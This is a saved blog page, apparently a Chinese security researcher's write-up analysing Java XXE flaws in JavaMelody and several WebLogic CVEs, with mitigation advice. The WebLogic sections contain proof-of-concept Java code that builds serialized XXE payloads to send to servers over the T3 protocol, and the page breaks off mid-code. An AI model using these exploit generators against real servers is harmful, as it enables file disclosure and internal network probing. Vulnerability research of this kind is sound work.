@@ -1,0 +1,684 @@
+﻿<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="referrer" content="origin" />
+    <meta property="og:description" content="本文首发于oppo安全应急响应中心： https://mp.weixin.qq.com/s?__biz=MzUyNzc4Mzk3MQ==&amp;amp;mid=2247485488&amp;amp;idx=1&amp;am" />
+    <meta http-equiv="Cache-Control" content="no-transform" />
+    <meta http-equiv="Cache-Control" content="no-siteapp" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <title>Java XXE漏洞典型场景分析 - tr1ple - 博客园</title>
+    
+    <link rel="stylesheet" href="/css/blog-common.min.css?v=Z9Vw4btcgJmrpUEjY_SgebmTmDXJ_hPFoST7ad2aJp4" />
+    
+    <link type="text/css" rel="stylesheet" href="https://www.cnblogs.com/tr1ple/custom.css?v=ytmQtB1oUcves9yhWLSGzmDcOKw=" />
+    <link id="mobile-style" media="only screen and (max-width: 767px)" type="text/css" rel="stylesheet" href="/skins/SimpleMemory/bundle-SimpleMemory-mobile.min.css" />
+    
+    <link type="application/rss+xml" rel="alternate" href="https://www.cnblogs.com/tr1ple/rss" />
+    <link type="application/rsd+xml" rel="EditURI" href="https://www.cnblogs.com/tr1ple/rsd.xml" />
+    <link type="application/wlwmanifest+xml" rel="wlwmanifest" href="https://www.cnblogs.com/tr1ple/wlwmanifest.xml" />
+    <script src="https://common.cnblogs.com/scripts/jquery-2.2.0.min.js"></script>
+    <script src="/js/blog-common.min.js?v=98Fvfd6UZH20B_MF08daNaODjSu879MVR9RHmyvWAlg"></script>
+    <script>
+        var currentBlogId = 316934;
+        var currentBlogApp = 'tr1ple';
+        var cb_enable_mathjax = false;
+        var isLogined = false;
+        var skinName = 'SimpleMemory';
+    </script>
+    
+    
+    
+</head>
+<body>
+    <a name="top"></a>
+    
+    
+<!--done-->
+<div id="home">
+<div id="header">
+	<div id="blogTitle">
+        <a id="lnkBlogLogo" href="https://www.cnblogs.com/tr1ple/"><img id="blogLogo" src="/skins/custom/images/logo.gif" alt="返回主页" /></a>		
+		
+<!--done-->
+<h1><a id="Header1_HeaderTitle" class="headermaintitle HeaderMainTitle" href="https://www.cnblogs.com/tr1ple/">tr1ple</a>
+</h1>
+<h2>
+To make each day count. Make small but daily progress.
+</h2>
+
+
+
+
+		
+	</div><!--end: blogTitle 博客的标题和副标题 -->
+	<div id="navigator">
+		
+<ul id="navList">
+<li><a id="blog_nav_sitehome" class="menu" href="https://www.cnblogs.com/">
+博客园</a>
+</li>
+<li>
+<a id="blog_nav_myhome" class="menu" href="https://www.cnblogs.com/tr1ple/">
+首页</a>
+</li>
+<li>
+
+<a id="blog_nav_newpost" class="menu" href="https://i.cnblogs.com/EditPosts.aspx?opt=1">
+新随笔</a>
+</li>
+<li>
+<a id="blog_nav_contact" class="menu" href="https://msg.cnblogs.com/send/tr1ple">
+联系</a></li>
+<li>
+<a id="blog_nav_rss" class="menu" href="https://www.cnblogs.com/tr1ple/rss/">
+订阅</a>
+<!--<partial name="./Shared/_XmlLink.cshtml" model="Model" /></li>--></li>
+<li>
+<a id="blog_nav_admin" class="menu" href="https://i.cnblogs.com/">
+管理</a>
+</li>
+</ul>
+
+
+		<div class="blogStats">
+			
+			<span id="stats_post_count">随笔 - 
+131&nbsp; </span>
+<span id="stats_article_count">文章 - 
+2&nbsp; </span>
+<span id="stats-comment_count">评论 - 
+18</span>
+
+			
+		</div><!--end: blogStats -->
+	</div><!--end: navigator 博客导航栏 -->
+</div><!--end: header 头部 -->
+
+<div id="main">
+	<div id="mainContent">
+	<div class="forFlow">
+		<div id="post_detail">
+    <!--done-->
+    <div id="topics">
+        <div class="post">
+            <h1 class = "postTitle">
+                
+<a id="cb_post_title_url" class="postTitle2" href="https://www.cnblogs.com/tr1ple/p/12522623.html">Java XXE漏洞典型场景分析</a>
+
+            </h1>
+            <div class="clear"></div>
+            <div class="postBody">
+                
+<div id="cnblogs_post_body" class="blogpost-body ">
+    <p><span style="font-size: 16px; color: #ff0000;">本文首发于oppo安全应急响应中心：</span></p>
+<p><span style="font-size: 16px; color: #ff0000;"><a href="https://mp.weixin.qq.com/s?__biz=MzUyNzc4Mzk3MQ==&amp;mid=2247485488&amp;idx=1&amp;sn=65098eb75e035ff2f90d1ea552c4100a&amp;chksm=fa7b097ccd0c806a40dd62a1f629b4753dc4b57e6af0ad618656234c46f4dfeef01140ce25a4&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1586263198516&amp;sharer_shareid=ae6683d6c0e7df9a0b7c15e7cacf6b3c#rd"><span style="color: #ff0000;">https://mp.weixin.qq.com/s?__biz=MzUyNzc4Mzk3MQ==&amp;mid=2247485488&amp;idx=1&amp;sn=65098eb75e035ff2f90d1ea552c4100a&amp;chksm=fa7b097ccd0c806a40dd62a1f629b4753dc4b57e6af0ad618656234c46f4dfeef01140ce25a4&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1586263198516&amp;sharer_shareid=ae6683d6c0e7df9a0b7c15e7cacf6b3c#rd</span></a></span></p>
+<h1>0x01 前言：</h1>
+<p>　　XML 的解析过程中若存在外部实体，若不添加安全的XML解析配置，则XML文档将包含来自外部 URI 的数据。这一行为将导致XML External Entity (XXE) 攻击，从而用于拒绝服务攻击，任意文件读取，扫内网扫描。以前对xxe的认识多停留在php中，从代码层面而言，其形成原因及防护措施较为单一，而java中依赖于其丰富的库，导致解析xml数据的方式有多种，其防御手段也有着种种联系，本文主要从几个cve的分析，了解java中xxe的常用xml解析库、xxe的形成原因、java中xxe的防护手段以及如何挖掘java中的xxe。</p>
+<h1>0x02 XXE相关分析：</h1>
+<h2>1.JavaMelody组件XXE</h2>
+<p>JavaMelody是一个用来对Java应用进行监控的组件。通过该组件，用户可以对内存、CPU、用户session甚至SQL请求等进行监控，并且该组件提供了一个可视化界面给用户使用。</p>
+<p>默认情况下只要将其添加pom依赖中，其将随web服务一起启动，所以不需要什么权限即可访问此路由，若路径泄露如下图所示本来就会泄露一些敏感信息</p>
+<p><img src="https://img2020.cnblogs.com/blog/1063309/202003/1063309-20200319173812972-1964374275.png" alt="" width="458" height="175"></p>
+<h3>1.1 漏洞点分析</h3>
+<p>在monitor的filter匹配之后将会对请求的http请求内容做处理获取请求类型，在net/bull/javamelody/PayloadNameRequestWrapper中在处理当content-type为以下两种情况：</p>
+<div class="cnblogs_code">
+<pre>1.contentType.startsWith("application/soap+xml"<span style="color: #000000;">)
+
+</span>2.contentType.startsWith("text/xml") || requests.getheader("SOAPAction")</pre>
+</div>
+<p>部分函数调用栈如下图所示：</p>
+<p><img src="https://img2020.cnblogs.com/blog/1063309/202003/1063309-20200328173052095-1256574665.png" alt="" width="670" height="404"></p>
+<p>在content type满足xml数据请求规则后调用parseSoapMethodName来对http请求内容做解析，这个函数就是漏洞所在处</p>
+<p><img src="https://img2020.cnblogs.com/blog/1063309/202003/1063309-20200319175942693-925513956.png" alt="" width="1304" height="43"></p>
+<p>这里使用xmlInputFactor工厂类，该类与DocmentBuilderFactory一样都可以设置一些feature来规范化xml处理过程，那么问题就是<span style="color: #000000;">默认情况下dtd解析和外部实体都是可以使用的,如下两条配置即为导致xxe的默认配置</span><span style="color: #ff0000;"><br /></span></p>
+<div class="cnblogs_code">
+<pre>&lt;tr&gt;&lt;td&gt;javax.xml.stream.isSupportingExternalEntities&lt;/td&gt;&lt;td&gt;Resolve external parsed entities&lt;/td&gt;&lt;td&gt;Boolean&lt;/td&gt;&lt;td&gt;Unspecified&lt;/td&gt;&lt;td&gt;Yes&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td&gt;javax.xml.stream.supportDTD&lt;/td&gt;&lt;td&gt;Use <span style="color: #0000ff;">this</span> property to request processors that <span style="color: #0000ff;">do</span> not support DTDs&lt;/td&gt;&lt;td&gt;Boolean&lt;/td&gt;&lt;td&gt;True&lt;/td&gt;&lt;td&gt;Yes&lt;/td&gt;&lt;/tr&gt;</pre>
+</div>
+<p>在xmlInputFactor类的文件中就可以找到默认的一些feature，我们可以将feature理解为为了解析xml而提供的配置选项</p>
+<p><img src="https://img2020.cnblogs.com/blog/1063309/202003/1063309-20200319180105870-511645132.png" alt="" width="722" height="306"></p>
+<p>&nbsp;pom依赖：</p>
+<div class="cnblogs_code">
+<pre>        &lt;dependency&gt;
+            &lt;groupId&gt;net.bull.javamelody&lt;/groupId&gt;
+            &lt;artifactId&gt;javamelody-spring-boot-starter&lt;/artifactId&gt;
+            &lt;version&gt;1.73.1&lt;/version&gt;
+        &lt;/dependency&gt;</pre>
+</div>
+<p><img src="https://img2020.cnblogs.com/blog/1063309/202003/1063309-20200328174544808-1374975043.png" alt="" width="926" height="311"></p>
+<h3>1.2 代码层面修复</h3>
+<p>那么在该组件的新版本中对应的修复如下图所示，默认情况下在创建xml解析对象之前设置工厂的feature禁用掉dtd和外部实体，从而防御xxe</p>
+<p>&nbsp;<img src="https://img2020.cnblogs.com/blog/1063309/202003/1063309-20200319182203254-1839294237.png" alt="" width="789" height="226"></p>
+<h3>1.3 如何避免xxe</h3>
+<p>&nbsp; &nbsp; &nbsp; &nbsp;在实际的开发中，对于xml数据解析流程不需要外部实体参与的情况，设置feature将其禁用。在确定组件版本对xml的解析已经禁用掉外部实体后，也要设计filter来对该功能的访问进行鉴权操作，防止敏感功能被越权访问。</p>
+<h2>2.weblogic中的xxe</h2>
+<p>　　这节主要分析weblogic中的几个xxe，包括CVE-2019-2647-CVE2019-2650以及CVE2019-2888，那么这几个洞的原因都是weblogic依赖的jar包中涉及xml数据处理时默认情况下没有做好外部实体限制措施，导致可以通过T3协议进行序列化payload发送，从而利用外部实体进行xxe</p>
+<h3>2.1 漏洞点分析　　</h3>
+<p>　　第一处是是Oracle/Middleware/wlserver_10.3/server/lib/weblogic.jar下的weblogic/wsee/reliability/WsrmServerPayloadContext，从weblogic输入流处理到xml数据解析入口的部分调用栈如下图所示：</p>
+<p><img src="https://img2020.cnblogs.com/blog/1063309/202003/1063309-20200328152240721-1974388690.png" alt="" width="630" height="189"></p>
+<p>　　在WsrmServerPayloadContext的readEndpt方法中直接就能发现存在xml解析，其中使用DocumentBuilderFactory类作为解析工厂类，这里并没有添加任何feature限制外部实体的加载，所以只需要关心var14是否可控</p>
+<p><img src="https://img2020.cnblogs.com/blog/1063309/202003/1063309-20200322213805721-262054193.png" alt="" width="756" height="369"></p>
+<p>那么在WsrmServerPayloadContext的readExternal方法调用了readEndpt方法，该方法将在反序列化时自动调用，与通常的readObject相类似，而readEndpt中的var14又来自此时的var1(payload 输入流)，所以满足可控条件</p>
+<p><img src="https://img2020.cnblogs.com/blog/1063309/202003/1063309-20200322214456328-1355587140.png" alt="" width="1123" height="251"></p>
+<p>那么从反序列化到xxe的入口点就是如此，接下来只需要构造满足条件的反序列化数据流通过t3协议发送到weblogic的7001端口即可，找到该类的序列化时调用的函数然后跟踪其输出流就行</p>
+<p><img src="https://img2020.cnblogs.com/blog/1063309/202003/1063309-20200322221014426-389239062.png" alt="" width="751" height="133"></p>
+<p>在writeExternal中判断this.fromEndpt不为null时，调用writeEndpt传入输出流， 可以看到this.fromEndpt实际上是EndpointReference的实例，根据方法名以及入口参数盲猜要将该类的实例写进输出流<img src="https://img2020.cnblogs.com/blog/1063309/202003/1063309-20200322221658914-1135746335.png" alt="" width="866" height="134"></p>
+<p>那么实际上该函数的功能也主要是通过XMLSerializer的serlialize处理EndpointReference的返回值(Element类的实例)后最终存储为字节数组，并在输出流中写入字节数组和其长度，那么XMLSerializer的serialize方法的实现了3种重载，分别可以传入Element,DocumentFragment,Document，那么实际上构造xml的payload时如果使用Element型的重载，那么实际上写入的序列化数据中包含的xml数据外部实体将被解析最终只留下节点元素，所以为了在payload中保留完整的xml的payload，需要使用Document型的重载，因此这里需要重写WsrmServerPayloadContext的writeEndpt方法即可，我们只需删除jar包中对应的class字节码文件重新打包引入，然后本地新建与其包名类名一致的该类即可，从而定制如我们目标相符合的序列化数据(接下来几个weblogic的xxe payload本地构造方法均与此一样)</p>
+<p><img src="https://img2020.cnblogs.com/blog/1063309/202003/1063309-20200322224024518-40220136.png" alt=""></p>
+<p>&nbsp;构造结构如上图所示，我们知道DocumentBuilder的parse处理xml文件后将返回Document，因此我们只需要将处理结果再传入serialize函数即可达成目标</p>
+<p>&nbsp;<img src="https://img2020.cnblogs.com/blog/1063309/202003/1063309-20200322224131950-1660105215.png" alt="" width="416" height="189"></p>
+<p>&nbsp;重写部分如下所示：</p>
+<div class="cnblogs_code">
+<pre><span style="color: #0000ff;">private</span> <span style="color: #0000ff;">void</span> writeEndpt(EndpointReference var1, ObjectOutput var2) <span style="color: #0000ff;">throws</span><span style="color: #000000;"> IOException, ParserConfigurationException, SAXException {
+        ByteArrayOutputStream var3 </span>= <span style="color: #0000ff;">new</span><span style="color: #000000;"> ByteArrayOutputStream();
+        OutputFormat var4 </span>= <span style="color: #0000ff;">new</span> OutputFormat("XML", (String)<span style="color: #0000ff;">null</span>, <span style="color: #0000ff;">false</span><span style="color: #000000;">);
+        XMLSerializer var5 </span>= <span style="color: #0000ff;">new</span><span style="color: #000000;"> XMLSerializer(var3, var4);
+        Document doc </span>= <span style="color: #0000ff;">null</span><span style="color: #000000;">;
+        Element element </span>= <span style="color: #0000ff;">null</span><span style="color: #000000;">;
+        DocumentBuilderFactory dbFactory </span>=<span style="color: #000000;"> DocumentBuilderFactory.newInstance();
+        DocumentBuilder dbBuilder </span>=<span style="color: #000000;"> dbFactory.newDocumentBuilder();
+        doc </span>= dbBuilder.parse(System.getProperty("user.dir")+"/src/main/resources/text.xml"<span style="color: #000000;">);
+        var5.serialize(doc);</span></pre>
+</div>
+<p>那么根据之前的分析只需赋值his.fromEndpt为EndpointReference的实例，然后我们自己在重写的writeEndpt方法中调用DocumentBuilder的parse解析xml的payload拿到document即可</p>
+<p>poc如下：</p>
+<div class="cnblogs_code">
+<pre><span style="color: #0000ff;">import</span><span style="color: #000000;"> weblogic.wsee.addressing.EndpointReference;
+</span><span style="color: #0000ff;">import</span><span style="color: #000000;"> weblogic.wsee.reliability.WsrmServerPayloadContext;
+</span><span style="color: #0000ff;">import</span><span style="color: #000000;"> java.io.FileOutputStream;
+</span><span style="color: #0000ff;">import</span><span style="color: #000000;"> java.io.IOException;
+</span><span style="color: #0000ff;">import</span><span style="color: #000000;"> java.io.ObjectOutputStream;
+</span><span style="color: #0000ff;">import</span><span style="color: #000000;"> java.lang.reflect.Field;
+
+</span><span style="color: #0000ff;">public</span> <span style="color: #0000ff;">class</span><span style="color: #000000;"> weblogicxxe1 {
+    </span><span style="color: #0000ff;">public</span> <span style="color: #0000ff;">static</span> <span style="color: #0000ff;">void</span> main(String[] args) <span style="color: #0000ff;">throws</span><span style="color: #000000;"> IOException {
+        Object instance </span>=<span style="color: #000000;"> getObject();
+        ObjectOutputStream out </span>= <span style="color: #0000ff;">new</span> ObjectOutputStream(<span style="color: #0000ff;">new</span> FileOutputStream("xxe"<span style="color: #000000;">));
+        out.writeObject(instance);
+        out.flush();
+        out.close();
+    }
+    </span><span style="color: #0000ff;">public</span> <span style="color: #0000ff;">static</span><span style="color: #000000;"> Object getObject() {
+        EndpointReference fromEndpt </span>= (EndpointReference) <span style="color: #0000ff;">new</span><span style="color: #000000;"> EndpointReference();
+        WsrmServerPayloadContext wspc </span>= <span style="color: #0000ff;">new</span><span style="color: #000000;"> WsrmServerPayloadContext();
+        </span><span style="color: #0000ff;">try</span><span style="color: #000000;"> {
+            Field f1 </span>= wspc.getClass().getDeclaredField("fromEndpt"<span style="color: #000000;">);
+            f1.setAccessible(</span><span style="color: #0000ff;">true</span><span style="color: #000000;">);
+            f1.set(wspc, fromEndpt);
+        } </span><span style="color: #0000ff;">catch</span><span style="color: #000000;"> (Exception e) {
+            e.printStackTrace();
+        }
+        </span><span style="color: #0000ff;">return</span><span style="color: #000000;"> wspc;
+    }
+}</span></pre>
+</div>
+<p>生成的poc如下所示，序列化的数据包含完整的xml payload，然后使用t3协议直接打即可，由请求也可以看到的确在反序列化的过程中解析了xml并加载了外部实体</p>
+<p><img src="https://img2020.cnblogs.com/blog/1063309/202003/1063309-20200322225417329-1766504181.png" alt="" width="560" height="308"></p>
+<p>&nbsp;<img src="https://img2020.cnblogs.com/blog/1063309/202003/1063309-20200322230025027-1502715878.png" alt="" width="591" height="237"></p>
+<p>第二处位于Oracle/Middleware/wlserver_10.3/server/lib/weblogic.jar下的weblogic/wsee/message/UnknownMsgHeader类，该类的readExternal方法中直接存在没有任何防御措施的xml解析，使用的仍为DocumentBuilderFactory，从weblogic输入流处理到xml数据解析入口的部分调用栈如下图所示：</p>
+<p><img src="https://img2020.cnblogs.com/blog/1063309/202003/1063309-20200328153113789-1606902049.png" alt=""></p>
+<p>在UnknownMsgHeader的readExternal方法中xml解析时的parse方法入口参数var9主要来源于输入流Objectinput，可控，那么只需构造相应的序列化数据即可</p>
+<p>&nbsp;<img src="https://img2020.cnblogs.com/blog/1063309/202003/1063309-20200322232040481-575801277.png" alt="" width="966" height="148"></p>
+<p>找到其writeExternal方法，这里可以看到其写入xml payload时也使用的为XMLSerializer.serialize，这里写入的xmlheader也可以进行替换成xml解析后的Document类的实例，但是这里要用到this.qname属性，并向输出流写入该属性的三个值，由于这三个值均为字符串并且并未规定格式，因此我们只需任意赋值即可</p>
+<p><img src="https://img2020.cnblogs.com/blog/1063309/202003/1063309-20200322235512463-45742501.png" alt="" width="661" height="239"></p>
+<p>修改其writeExternal方法如下：</p>
+<div class="cnblogs_code">
+<pre><span style="color: #0000ff;">public</span> <span style="color: #0000ff;">void</span> writeExternal(ObjectOutput var1) <span style="color: #0000ff;">throws</span><span style="color: #000000;"> IOException{
+        var1.writeUTF(</span>"tr1ple"<span style="color: #000000;">);
+        var1.writeUTF(</span>"tr1ple"<span style="color: #000000;">);
+        var1.writeUTF(</span>"tr1ple"<span style="color: #000000;">);
+        ByteArrayOutputStream var2 </span>= <span style="color: #0000ff;">new</span><span style="color: #000000;"> ByteArrayOutputStream();
+        OutputFormat var3 </span>= <span style="color: #0000ff;">new</span> OutputFormat("XML", (String)<span style="color: #0000ff;">null</span>, <span style="color: #0000ff;">false</span><span style="color: #000000;">);
+        XMLSerializer var4 </span>= <span style="color: #0000ff;">new</span><span style="color: #000000;"> XMLSerializer(var2, var3);
+        Document doc </span>= <span style="color: #0000ff;">null</span><span style="color: #000000;">;
+        DocumentBuilderFactory dbFactory </span>=<span style="color: #000000;"> DocumentBuilderFactory.newInstance();
+        DocumentBuilder dbBuilder </span>= <span style="color: #0000ff;">null</span><span style="color: #000000;">;
+        </span><span style="color: #0000ff;">try</span><span style="color: #000000;"> {
+            dbBuilder </span>=<span style="color: #000000;"> dbFactory.newDocumentBuilder();
+            doc </span>= dbBuilder.parse(System.getProperty("user.dir")+"/src/main/resources/text.xml"<span style="color: #000000;">);
+        } </span><span style="color: #0000ff;">catch</span><span style="color: #000000;"> (ParserConfigurationException e) {
+            e.printStackTrace();
+        } </span><span style="color: #0000ff;">catch</span><span style="color: #000000;"> (SAXException e) {
+            e.printStackTrace();
+        }
+        var4.serialize(doc);</span></pre>
+</div>
+<p>&nbsp;poc：</p>
+<div class="cnblogs_code">
+<pre><span style="color: #0000ff;">import</span><span style="color: #000000;"> org.w3c.dom.Element;
+</span><span style="color: #0000ff;">import</span><span style="color: #000000;"> weblogic.wsee.message.UnknownMsgHeader;<br /></span><span style="color: #0000ff;">import</span><span style="color: #000000;"> java.io.FileOutputStream;
+</span><span style="color: #0000ff;">import</span><span style="color: #000000;"> java.io.IOException;
+</span><span style="color: #0000ff;">import</span><span style="color: #000000;"> java.io.ObjectOutputStream;
+</span><span style="color: #0000ff;">import</span><span style="color: #000000;"> java.lang.reflect.Field;
+
+</span><span style="color: #0000ff;">public</span> <span style="color: #0000ff;">class</span><span style="color: #000000;"> weblogicxxe2 {
+    </span><span style="color: #0000ff;">public</span> <span style="color: #0000ff;">static</span> <span style="color: #0000ff;">void</span> main(String[] args) <span style="color: #0000ff;">throws</span><span style="color: #000000;"> IOException {
+        Object instance </span>=<span style="color: #000000;"> getObject();
+        ObjectOutputStream out </span>= <span style="color: #0000ff;">new</span> ObjectOutputStream(<span style="color: #0000ff;">new</span> FileOutputStream("xxe3"<span style="color: #000000;">));
+        out.writeObject(instance);
+        out.flush();
+        out.close();
+    }
+    </span><span style="color: #0000ff;">public</span> <span style="color: #0000ff;">static</span><span style="color: #000000;"> Object getObject() {
+        UnknownMsgHeader umh </span>= <span style="color: #0000ff;">new</span><span style="color: #000000;"> UnknownMsgHeader();
+        </span><span style="color: #0000ff;">return</span><span style="color: #000000;"> umh;
+    }
+}</span></pre>
+</div>
+<p>生成序列化数据后用t3协议发送即可触发xxe</p>
+<p>第三处位于Oracle/Middleware/wlserver_10.3/server/lib/weblogic.jar下的weblogic/wsee/reliability/WsrmSequenceContext类，在其readEndpt方法中同样存在与前两个分析中相似的处理流程，使用DocumentBuilder来解析包含xml payload的输入流，从weblogic输入流处理到xml数据解析入口的部分调用栈如下图所示：</p>
+<p><img src="https://img2020.cnblogs.com/blog/1063309/202003/1063309-20200328154240360-1550268825.png" alt=""></p>
+<p>&nbsp;在其readExternal方法中调用了readEndpt方法，这里var2为我们构造的xml数据的长度，所以肯定大于零</p>
+<p><img src="https://img2020.cnblogs.com/blog/1063309/202003/1063309-20200323113510009-1730985231.png" alt="" width="739" height="291"></p>
+<p>&nbsp;<img src="https://img2020.cnblogs.com/blog/1063309/202003/1063309-20200323113515317-882929101.png" alt="" width="663" height="261"></p>
+<p>那么只需要按照其writeEndpt规范的逻辑写就行，我们只需在调用serialize前控制其入口参数的值即可</p>
+<p><img src="https://img2020.cnblogs.com/blog/1063309/202003/1063309-20200323105357858-1999954643.png" alt="" width="629" height="265"></p>
+<p>&nbsp;更改后的writeExternal如下：</p>
+<div class="cnblogs_code">
+<pre><span style="color: #0000ff;">private</span> <span style="color: #0000ff;">void</span> writeEndpt(EndpointReference var1, ObjectOutput var2) <span style="color: #0000ff;">throws</span><span style="color: #000000;"> IOException {
+        </span><span style="color: #0000ff;">try</span><span style="color: #000000;"> {
+            DocumentBuilderFactory var3 </span>=<span style="color: #000000;"> DocumentBuilderFactory.newInstance();
+            var3.setNamespaceAware(</span><span style="color: #0000ff;">true</span><span style="color: #000000;">);
+            DocumentBuilder var4 </span>=<span style="color: #000000;"> var3.newDocumentBuilder();
+            Document var5 </span>=<span style="color: #000000;"> var4.newDocument();
+            Element var6 </span>= var5.createElementNS(<span style="color: #0000ff;">this</span>.rmVersion.getNamespaceUri(), weblogic.wsee.reliability.WsrmConstants.Element.ACKS_TO.getQualifiedName(<span style="color: #0000ff;">this</span><span style="color: #000000;">.rmVersion));
+            DOMUtils.addNamespaceDeclaration(var6, </span><span style="color: #0000ff;">this</span>.rmVersion.getPrefix(), <span style="color: #0000ff;">this</span><span style="color: #000000;">.rmVersion.getNamespaceUri());
+            var1.write(var6);
+            ByteArrayOutputStream var7 </span>= <span style="color: #0000ff;">new</span><span style="color: #000000;"> ByteArrayOutputStream();
+            OutputFormat var8 </span>= <span style="color: #0000ff;">new</span> OutputFormat("XML", (String)<span style="color: #0000ff;">null</span>, <span style="color: #0000ff;">false</span><span style="color: #000000;">);
+            XMLSerializer var9 </span>= <span style="color: #0000ff;">new</span><span style="color: #000000;"> XMLSerializer(var7, var8);
+            Document doc </span>= <span style="color: #0000ff;">null</span><span style="color: #000000;">;
+            DocumentBuilderFactory dbFactory </span>=<span style="color: #000000;"> DocumentBuilderFactory.newInstance();
+            DocumentBuilder dbBuilder </span>=<span style="color: #000000;"> dbFactory.newDocumentBuilder();
+            doc </span>= dbBuilder.parse(System.getProperty("user.dir")+"/src/main/resources/text.xml"<span style="color: #000000;">); 
+            var9.serialize(doc);</span></pre>
+</div>
+<p>poc：</p>
+<div class="cnblogs_code">
+<pre><span style="color: #0000ff;">import</span><span style="color: #000000;"> weblogic.wsee.addressing.EndpointReference;
+</span><span style="color: #0000ff;">import</span><span style="color: #000000;"> weblogic.wsee.reliability.WsrmSequenceContext;
+</span><span style="color: #0000ff;">import</span><span style="color: #000000;"> java.io.FileOutputStream;
+</span><span style="color: #0000ff;">import</span><span style="color: #000000;"> java.io.IOException;
+</span><span style="color: #0000ff;">import</span><span style="color: #000000;"> java.io.ObjectOutputStream;
+</span><span style="color: #0000ff;">import</span><span style="color: #000000;"> java.lang.reflect.Field;
+
+</span><span style="color: #0000ff;">public</span> <span style="color: #0000ff;">class</span><span style="color: #000000;"> weblogicxxe3 {
+    </span><span style="color: #0000ff;">public</span> <span style="color: #0000ff;">static</span> <span style="color: #0000ff;">void</span> main(String[] args) <span style="color: #0000ff;">throws</span><span style="color: #000000;"> IOException {
+        Object instance </span>=<span style="color: #000000;"> getObject();
+        ObjectOutputStream out </span>= <span style="color: #0000ff;">new</span> ObjectOutputStream(<span style="color: #0000ff;">new</span> FileOutputStream("xxe4"<span style="color: #000000;">));
+        out.writeObject(instance);
+        out.flush();
+        out.close();
+    }
+
+    </span><span style="color: #0000ff;">public</span> <span style="color: #0000ff;">static</span><span style="color: #000000;"> Object getObject() {
+        EndpointReference  end </span>= <span style="color: #0000ff;">new</span><span style="color: #000000;"> EndpointReference();
+        WsrmSequenceContext umh </span>= <span style="color: #0000ff;">new</span><span style="color: #000000;"> WsrmSequenceContext();
+
+        </span><span style="color: #0000ff;">try</span><span style="color: #000000;"> {
+            Field f1 </span>= umh.getClass().getDeclaredField("acksTo"<span style="color: #000000;">);
+            f1.setAccessible(</span><span style="color: #0000ff;">true</span><span style="color: #000000;">);
+            f1.set(umh, end);
+
+        } </span><span style="color: #0000ff;">catch</span><span style="color: #000000;"> (Exception e) {
+            e.printStackTrace();
+        }
+         </span><span style="color: #0000ff;">return</span><span style="color: #000000;"> umh;
+    }
+}</span></pre>
+</div>
+<p>&nbsp;第四处位于Oracle/Middleware/wlserver_10.3/server/lib/weblogic.jar下的weblogic/wsee/wstx/internal/ForeignRecoveryContext类，从weblogic输入流处理到反序列化入口的过程部分调用栈如下图所示：</p>
+<p><img src="https://img2020.cnblogs.com/blog/1063309/202003/1063309-20200328143714615-615513050.png" alt=""></p>
+<p>　　在ForeignRecoveryContext的类文件定义中如果直接找并未发现xml的处理流程，该处的利用相较于前三处构造来说还是稍微精巧一点,需要了解一下代码的基本处理逻辑。网上也没找到相应的具体分析，只有xxlegend师傅的一些简单复现分析，先给出其poc</p>
+<div class="cnblogs_code">
+<pre><span style="color: #0000ff;">import</span><span style="color: #000000;"> weblogic.wsee.wstx.internal.ForeignRecoveryContext;
+</span><span style="color: #0000ff;">import</span><span style="color: #000000;"> weblogic.wsee.wstx.wsat.Transactional.Version;
+</span><span style="color: #0000ff;">import</span><span style="color: #000000;"> javax.xml.ws.EndpointReference;
+
+</span><span style="color: #0000ff;">import</span><span style="color: #000000;"> javax.transaction.xa.Xid;
+</span><span style="color: #0000ff;">import</span><span style="color: #000000;"> javax.xml.transform.Result;
+</span><span style="color: #0000ff;">import</span><span style="color: #000000;"> javax.xml.transform.stream.StreamResult;
+</span><span style="color: #0000ff;">import</span> java.io.*<span style="color: #000000;">;
+</span><span style="color: #0000ff;">import</span><span style="color: #000000;"> java.lang.reflect.Field;
+
+</span><span style="color: #0000ff;">public</span> <span style="color: #0000ff;">class</span><span style="color: #000000;"> weblogicxxe4 {
+    </span><span style="color: #0000ff;">public</span> <span style="color: #0000ff;">static</span> <span style="color: #0000ff;">void</span> main(String[] args) <span style="color: #0000ff;">throws</span><span style="color: #000000;"> IOException {
+        Object instance </span>=<span style="color: #000000;"> getObject();
+        ObjectOutputStream out </span>= <span style="color: #0000ff;">new</span> ObjectOutputStream(<span style="color: #0000ff;">new</span> FileOutputStream("xxe1"<span style="color: #000000;">));
+        out.writeObject(instance);
+        out.flush();
+        out.close();
+    }
+
+    </span><span style="color: #0000ff;">public</span> <span style="color: #0000ff;">static</span> <span style="color: #0000ff;">class</span> MyEndpointReference <span style="color: #0000ff;">extends</span><span style="color: #000000;"> EndpointReference {
+
+        @Override
+        </span><span style="color: #0000ff;">public</span>  <span style="color: #0000ff;">void</span><span style="color: #000000;"> writeTo(Result result){
+            </span><span style="color: #0000ff;">byte</span>[] tmpbytes = <span style="color: #0000ff;">new</span> <span style="color: #0000ff;">byte</span>[4096<span style="color: #000000;">];
+            </span><span style="color: #0000ff;">int</span><span style="color: #000000;"> nRead;
+            </span><span style="color: #0000ff;">try</span><span style="color: #000000;">{
+                InputStream is </span>= <span style="color: #0000ff;">new</span> FileInputStream(System.getProperty("user.dir")+"/src/main/resources/text.xml"<span style="color: #000000;">);
+
+                </span><span style="color: #0000ff;">while</span>((nRead=is.read(tmpbytes,0,tmpbytes.length)) != -1<span style="color: #000000;">){
+                    ((StreamResult)result).getOutputStream().write(tmpbytes,</span>0<span style="color: #000000;">,nRead);
+                }
+            }</span><span style="color: #0000ff;">catch</span><span style="color: #000000;"> (Exception e){
+                e.printStackTrace();
+            }
+            </span><span style="color: #0000ff;">return</span><span style="color: #000000;">;
+        }
+    }
+    </span><span style="color: #0000ff;">public</span> <span style="color: #0000ff;">static</span><span style="color: #000000;"> Object getObject() {
+        Xid xid </span>= <span style="color: #0000ff;">new</span><span style="color: #000000;"> weblogic.transaction.internal.XidImpl();
+        Version v </span>=<span style="color: #000000;"> Version.DEFAULT;
+        ForeignRecoveryContext frc </span>= <span style="color: #0000ff;">new</span><span style="color: #000000;"> ForeignRecoveryContext();
+        </span><span style="color: #0000ff;">try</span><span style="color: #000000;">{
+            Field f </span>= frc.getClass().getDeclaredField("fxid"<span style="color: #000000;">);
